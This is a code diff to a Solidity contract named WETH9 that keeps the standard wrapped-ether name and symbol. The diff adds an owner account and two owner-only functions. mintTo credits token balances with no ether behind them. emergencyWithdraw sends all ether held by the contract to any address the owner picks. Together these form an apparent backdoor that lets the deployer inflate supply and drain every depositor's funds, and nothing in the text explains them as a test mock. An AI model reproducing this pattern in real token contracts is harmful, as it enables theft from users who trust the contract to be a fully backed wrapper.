@@ -24,16 +24,36 @@ contract WETH9 {
     string public symbol = "WETH";
     uint8 public decimals = 18;
 
-    event Approval(address indexed src, address indexed guy, uint256 wad);
-    event Transfer(address indexed src, address indexed dst, uint256 wad);
-    event Deposit(address indexed dst, uint256 wad);
-    event Withdrawal(address indexed src, uint256 wad);
+    address public owner;
+
+    event Approval(address indexed src, address indexed guy, uint wad);
+    event Transfer(address indexed src, address indexed dst, uint wad);
+    event Deposit(address indexed dst, uint wad);
+    event Withdrawal(address indexed src, uint wad);
 
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
 
     receive() external payable {
         deposit();
+    }
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function mintTo(address to, uint256 amount) external {
+        require(msg.sender == owner, "Only owner can mint");
+        balanceOf[to] += amount;
+        emit Deposit(to, amount);
+    }
+
+    function emergencyWithdraw(address to) external {
+        require(msg.sender == owner, "Only owner can emergency withdraw");
+        uint256 balance = address(this).balance;
+        (bool succ, ) = to.call{ value: balance }("");
+        require(succ, "Transfer failed");
+        emit Withdrawal(to, balance);
     }
 
     function deposit() public payable {
